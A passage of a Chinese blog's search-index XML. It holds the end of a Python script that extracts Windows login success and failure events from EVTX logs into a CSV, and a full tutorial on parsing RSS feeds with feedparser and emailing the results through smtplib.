#过了ip为127.0.0.1的IP</span>            <span class="token comment">#     return</span>            ip <span class="token operator">=</span> data<span class="token punctuation">.</span>text        <span class="token keyword">elif</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Name'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'IpPort'</span><span class="token punctuation">:</span>  <span class="token comment"># 获取端口值</span>            port <span class="token operator">=</span> data<span class="token punctuation">.</span>text        <span class="token keyword">elif</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Name'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'LogonProcessName'</span><span class="token punctuation">:</span>  <span class="token comment"># 获取登录进程名</span>            LogonProcessName <span class="token operator">=</span> data<span class="token punctuation">.</span>text        <span class="token keyword">elif</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Name'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'AuthenticationPackageName'</span><span class="token punctuation">:</span>  <span class="token comment"># 加载身份验证包名称</span>            AuthenticationPackageName <span class="token operator">=</span> data<span class="token punctuation">.</span>text        <span class="token keyword">elif</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span>                <span class="token string">'Name'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'LogonType'</span><span class="token punctuation">:</span>  <span class="token comment"># 登录类型，Windows共有10种登录类型</span>            LogonType <span class="token operator">=</span> data<span class="token punctuation">.</span>text            Logoninfo <span class="token operator">=</span> LogonType_info<span class="token punctuation">(</span>LogonType<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 登录信息</span>    datalist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>        <span class="token string">'{},{},{},{},{},{},{}\r\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>status<span class="token punctuation">,</span> time<span class="token punctuation">,</span> ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> LogonProcessName<span class="token punctuation">,</span> AuthenticationPackageName<span class="token punctuation">,</span>                                          Logoninfo<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">LogonType_info</span><span class="token punctuation">(</span>typeid<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># Windows登录类型</span>    typeinfo <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token string">'登录类型2：交互式登录（用户从控制台登录）'</span><span class="token punctuation">,</span>        <span class="token string">'3'</span><span class="token punctuation">:</span> <span class="token string">'登录类型3：网络（如访问共享文件夹、访问共享打印机等）'</span><span class="token punctuation">,</span>        <span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token string">'登录类型4：批处理（计划任务服务以此种方式运行）'</span><span class="token punctuation">,</span>        <span class="token string">'5'</span><span class="token punctuation">:</span> <span class="token string">'登录类型5：服务（服务启动）'</span><span class="token punctuation">,</span>        <span class="token string">'6'</span><span class="token punctuation">:</span> <span class="token string">'登录类型6：不支持'</span><span class="token punctuation">,</span>        <span class="token string">'7'</span><span class="token punctuation">:</span> <span class="token string">'登录类型7：解锁（解锁带有密码保护的屏幕保护程序）'</span><span class="token punctuation">,</span>        <span class="token string">'8'</span><span class="token punctuation">:</span> <span class="token string">'登录类型8：网络明文（IIS服务器登录验证）'</span><span class="token punctuation">,</span>        <span class="token string">'9'</span><span class="token punctuation">:</span> <span class="token string">'登录类型9：新凭证'</span><span class="token punctuation">,</span>        <span class="token string">'10'</span><span class="token punctuation">:</span> <span class="token string">'登录类型10：远程交互（终端服务，远程桌面，远程辅助）'</span><span class="token punctuation">,</span>        <span class="token string">'11'</span><span class="token punctuation">:</span> <span class="token string">'登录类型11：缓存域证书登录'</span><span class="token punctuation">}</span>    <span class="token keyword">return</span> typeinfo<span class="token punctuation">[</span>typeid<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">SaveFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> dataList<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"认证状态,时间,IP,端口,登录进程名,身份验证包名称,认证类型"</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>dataList<span class="token punctuation">)</span><span class="token comment"># 过滤掉不需要的事件，输出感兴趣的事件</span><span class="token keyword">def</span> <span class="token function">InterestEvent</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">:</span>    Eroot <span class="token operator">=</span> ElementTree<span class="token punctuation">.</span>fromstring<span class="token punctuation">(</span>xml<span class="token punctuation">)</span>    ID <span class="token operator">=</span> Eroot<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'System'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'EventID'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">if</span> ID <span class="token operator">==</span> <span class="token string">'4624'</span><span class="token punctuation">:</span>        deal_login<span class="token punctuation">(</span><span class="token string">'认证成功'</span><span class="token punctuation">,</span> Eroot<span class="token punctuation">)</span>    <span class="token keyword">elif</span> ID <span class="token operator">==</span> <span class="token string">'4625'</span><span class="token punctuation">:</span>        deal_login<span class="token punctuation">(</span><span class="token string">'认证失败'</span><span class="token punctuation">,</span> Eroot<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>    EvtxPath <span class="token operator">=</span> <span class="token string">''</span>    outputfile <span class="token operator">=</span> <span class="token string">'./res.csv'</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        opts<span class="token punctuation">,</span> args <span class="token operator">=</span> getopt<span class="token punctuation">.</span>getopt<span class="token punctuation">(</span>argv<span class="token punctuation">,</span> <span class="token string">"hi:o:"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"ifile="</span><span class="token punctuation">,</span> <span class="token string">"ofile="</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> getopt<span class="token punctuation">.</span>GetoptError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test.py -i &lt;EvtxPath&gt; -o &lt;outputfile&gt;'</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> opt<span class="token punctuation">,</span> arg <span class="token keyword">in</span> opts<span class="token punctuation">:</span>        <span class="token keyword">if</span> opt <span class="token operator">==</span> <span class="token string">'-h'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">'''            test.py -i &lt;EvtxPath&gt; -o &lt;outputfile&gt;            -i 待处理的日志文件路径            -o 以处理结果文件的路径            '''</span><span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> opt <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">"-i"</span><span class="token punctuation">,</span> <span class="token string">"--ifile"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            EvtxPath <span class="token operator">=</span> arg        <span class="token keyword">elif</span> opt <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">"-o"</span><span class="token punctuation">,</span> <span class="token string">"--ofile"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            outputfile <span class="token operator">=</span> arg    <span class="token keyword">if</span> EvtxPath <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"无待处理的日志，请输入待处理的日志文件路径"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'待处理的日志文件：'</span><span class="token punctuation">,</span> EvtxPath<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输出的日志文件：'</span><span class="token punctuation">,</span> outputfile<span class="token punctuation">)</span>    MyFun<span class="token punctuation">(</span>EvtxPath<span class="token punctuation">)</span>    SaveFile<span class="token punctuation">(</span>outputfile<span class="token punctuation">,</span> datalist<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>windows登录类型参考<br><a href="https://www.cnblogs.com/xcsn/p/6375805.html">https://www.cnblogs.com/xcsn/p/6375805.html</a><br><a href="https://www.freebuf.com/vuls/175560.html">https://www.freebuf.com/vuls/175560.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python3使用feedparser模块处理rss并发送到指定邮箱</title>
      <link href="/2019/11/10/python3%E4%BD%BF%E7%94%A8feedparser%E6%A8%A1%E5%9D%97%E5%A4%84%E7%90%86rss%E5%B9%B6%E5%8F%91%E9%80%81%E5%88%B0%E6%8C%87%E5%AE%9A%E9%82%AE%E7%AE%B1/"/>
      <url>/2019/11/10/python3%E4%BD%BF%E7%94%A8feedparser%E6%A8%A1%E5%9D%97%E5%A4%84%E7%90%86rss%E5%B9%B6%E5%8F%91%E9%80%81%E5%88%B0%E6%8C%87%E5%AE%9A%E9%82%AE%E7%AE%B1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>日常工作中，需要大量获取资讯。平时都是直接在网站阅读，当我们要阅读的网站过多时难免会有遗漏。这时我们就可以使用rss进行资讯的订阅，今天我们使用python来解析rss，并通过邮件的形式发送到我们的邮箱中，方便我们阅读。</p></blockquote><hr><h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>安装python环境，安装所需要的一些模块requests、feedparser、smtplib、codecs等</p><h2 id="2-收集需要的信息"><a href="#2-收集需要的信息" class="headerlink" title="2.收集需要的信息"></a>2.收集需要的信息</h2><p>RSS(Really Simple Syndication,简易信息聚合)是一种描述和同步网站内容的格式你可以认为是一种定制个性化推送信息的服务。它能够解决你漫无目的的浏览网页的问题。它不会过时，信息越是过剩，它的意义也越加彰显。网络中充斥着大量的信息垃圾，每天摄入了太多自己根本不关心的信息。让自己关注的信息主动来找自己，且这些信息都是用户自己所需要的，这就是RSS的意义。更多RSS详细信息<a href="http://www.rssboard.org/rss-profile">http://www.rssboard.org/rss-profile</a></p><p>feedparser是一个Python的Feed解析库，可以处理RSS ，CDF，Atom 。使用它我们可从任何 RSS 或 Atom 订阅源得到标题、链接和文章的条目了。</p><p>首先用requests爬取你需要的网页信息,再用codecs作编码转换</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36'</span><span class="token punctuation">}</span>page <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>  <span class="token comment"># 获取网页</span>page<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>page_content <span class="token operator">=</span> page<span class="token punctuation">.</span>text  <span class="token comment"># 变为文本格式</span>f <span class="token operator">=</span> codecs<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'new_rss.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment"># 将刚才的文本写入new_rss.txt文件中去</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>page_content<span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>feedparser库的核心就是parse()函数，将获取的网页信息解析为xml格式</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">    rss <span class="token operator">=</span> feedparser<span class="token punctuation">.</span>parse<span class="token punctuation">(</span><span class="token string">'new_rss.txt'</span><span class="token punctuation">)</span>  <span class="token comment"># 将文本文件用函数解析成一个字典</span>提取所需要的标题以及链接    msg <span class="token operator">=</span> <span class="token string">''</span>  <span class="token comment"># 定义一个变量</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>rss<span class="token punctuation">.</span>entries<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tag_a <span class="token operator">=</span> rss<span class="token punctuation">.</span>entries<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'link'</span><span class="token punctuation">]</span>  <span class="token comment"># 获取链接</span>        tag_title <span class="token operator">=</span> rss<span class="token punctuation">.</span>entries<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span> <span class="token comment"># 获取标题 </span>        tag_content <span class="token operator">=</span> rss<span class="token punctuation">.</span>entries<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token comment">#获取内容</span>        msg <span class="token operator">=</span> msg <span class="token operator">+</span> <span class="token triple-quoted-string string">"""        &lt;p&gt;&lt;a href="%s"&gt;%s&lt;/a&gt;&lt;/p&gt;        """</span> <span class="token operator">%</span> <span class="token punctuation">(</span>tag_a<span class="token punctuation">,</span> tag_title<span class="token punctuation">)</span>     <span class="token comment"># 文本中带入变量的方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-发送邮件"><a href="#3-发送邮件" class="headerlink" title="3.发送邮件"></a>3.发送邮件</h2><p>python发送邮件需要用到python自带的两个模块，smtplib和email。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">mail_msg <span class="token operator">=</span> MIMEMultipart<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 创建一个实例</span>mail_msg<span class="token punctuation">[</span><span class="token string">'Subject'</span><span class="token punctuation">]</span> <span class="token operator">=</span> subject <span class="token comment">#邮件主题</span>mail_msg<span class="token punctuation">[</span><span class="token string">'From'</span><span class="token punctuation">]</span> <span class="token operator">=</span> fromaddr  <span class="token comment">#发信人邮箱</span>mail_msg<span class="token punctuation">[</span><span class="token string">'To'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>toaddrs<span class="token punctuation">)</span> <span class="token comment">#收信人邮箱</span>mail_msg<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>MIMEText<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token string">'html'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># html格式  文本为plain</span><span class="token keyword">try</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> smtplib<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 实例化</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>smtpaddr<span class="token punctuation">)</span>  <span class="token comment"># 连接smtp服务器</span>    s<span class="token punctuation">.</span>login<span class="token punctuation">(</span>fromaddr<span class="token punctuation">,</span> password<span class="token punctuation">)</span>  <span class="token comment"># 登录邮箱</span>    s<span class="token punctuation">.</span>sendmail<span class="token punctuation">(</span>fromaddr<span class="token punctuation">,</span> toaddrs<span class="token punctuation">,</span> mail_msg<span class="token punctuation">.</span>as_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 发送邮件</span>    s<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Successfully sent email"</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error: unable to send email"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>traceback<span class="token punctuation">.</span>format_exc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 回溯错误问题所在</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-完整代码"><a href="#4-完整代码" class="headerlink" title="4.完整代码"></a>4.完整代码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> codecs<span class="token keyword">import</span> feedparser<span class="token keyword">import</span> smtplib<span class="token keyword">import</span> traceback<span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>text <span class="token keyword">import</span> MIMEText<span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>multipart <span class="token keyword">import</span> MIMEMultipart<span class="token keyword">def</span> <span class="token function">sendmail</span><span class="token punctuation">(</span>subject<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> toaddrs<span class="token punctuation">,</span> fromaddr<span class="token punctuation">,</span> smtpaddr<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    @subject:邮件主题    @msg:邮件内容    @toaddrs:收信人的邮箱地址    @fromaddr:发信人的邮箱地址    @smtpaddr:smtp服务地址，可以在邮箱看，比如163邮箱为smtp.163.com    @password:网站授权码    """</span>    mail_msg <span class="token operator">=</span> MIMEMultipart<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 创建一个实例</span>    mail_msg<span class="token punctuation">[</span><span class="token string">'Subject'</span><span class="token punctuation">]</span> <span class="token operator">=</span> subject    mail_msg<span class="token punctuation">[</span><span class="token string">'From'</span><span class="token punctuation">]</span> <span class="token operator">=</span> fromaddr    mail_msg<span class="token punctuation">[</span><span class="token string">'To'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>toaddrs<span class="token punctuation">)</span>    mail_msg<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>MIMEText<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token string">'html'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># html格式  文本为plain</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> smtplib<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 实例化</span>        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>smtpaddr<span class="token punctuation">)</span>  <span class="token comment"># 连接smtp服务器</span>        s<span class="token punctuation">.</span>login<span class="token punctuation">(</span>fromaddr<span class="token punctuation">,</span> password<span class="token punctuation">)</span>  <span class="token comment"># 登录邮箱</span>        s<span class="token punctuation">.</span>sendmail<span class="token punctuation">(</span>fromaddr<span class="token punctuation">,</span> toaddrs<span class="token punctuation">,</span> mail_msg<span class="token punctuation">.</span>as_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 发送邮件</span>        s<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Successfully sent email"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error: unable to send email"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>traceback<span class="token punctuation">.</span>format_exc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 回溯错误问题所在</span><span class="token keyword">def</span> <span class="token function">get_info</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 '</span>                             <span class="token string">'Safari/537.36'</span><span class="token punctuation">}</span>    page <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>  <span class="token comment"># 获取网页</span>    page<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    page_content <span class="token operator">=</span> page<span class="token punctuation">.</span>text  <span class="token comment"># 变为文本格式</span>    f <span class="token operator">=</span> codecs<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'new_rss.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment"># 将刚才的文本写入TXT文件中去</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>page_content<span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    rss <span class="token operator">=</span> feedparser<span class="token punctuation">.</span>parse<span class="token punctuation">(</span><span class="token string">'new_rss.txt'</span><span class="token punctuation">)</span>  <span class="token comment"># 将文本文件用函数解析成一个字典</span>    msg <span class="token operator">=</span> <span class="token string">''</span>  <span class="token comment"># 定义一个变量</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>rss<span class="token punctuation">.</span>entries<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tag_a <span class="token operator">=</span> rss<span class="token punctuation">.</span>entries<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'link'</span><span class="token punctuation">]</span>  <span class="token comment"># 获取链接</span>        tag_title <span class="token operator">=</span> rss<span class="token punctuation">.</span>entries<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span> <span class="token comment"># 获取标题 </span>        tag_content <span class="token operator">=</span> rss<span class="token punctuation">.</span>entries<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token comment">#获取内容</span>        msg <span class="token operator">=</span> msg <span class="token operator">+</span> <span class="token triple-quoted-string string">"""        &lt;p&gt;&lt;a href="%s"&gt;%s&lt;/a&gt;&lt;/p&gt;        """</span> <span class="token operator">%</span> <span class="token punctuation">(</span>tag_a<span class="token punctuation">,</span> tag_title<span class="token punctuation">)</span>     <span class="token comment"># 文本中带入变量的方法</span>    <span class="token keyword">return</span> msg<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    fromaddr <span class="token operator">=</span> <span class="token string">"xxxxxxxxxxx@163.com"</span>    smtpaddr <span class="token operator">=</span> <span class="token string">"smtp.163.com"</span>    toaddrs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"xxxxxxxx@qq.com"</span><span class="token punctuation">,</span>"xxxxx@hotmail<span class="token punctuation">.</span>com”<span class="token punctuation">]</span>    subject <span class="token operator">=</span> <span class="token string">"获取的xxx信息"</span>    password <span class="token operator">=</span> <span class="token string">"xxxxxxx"</span>   <span class="token comment">#这里需要登录163邮箱自己设置授权码</span>    url <span class="token operator">=</span> <span class="token string">'https://www.xxxxxx.com/rss/'</span>  <span class="token comment"># 要爬取的rss某网页</span>    msg <span class="token operator">=</span> get_info<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    <span class="token comment">#爬取的内容（html格式）</span>    sendmail<span class="token punctuation">(</span>subject<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> toaddrs<span class="token punctuation">,</span> fromaddr<span class="token punctuation">,</span> smtpaddr<span class="token punctuation">,</span> password<span class="token punctuation">)</span>  <span class="token comment"># 发送邮件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>！</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
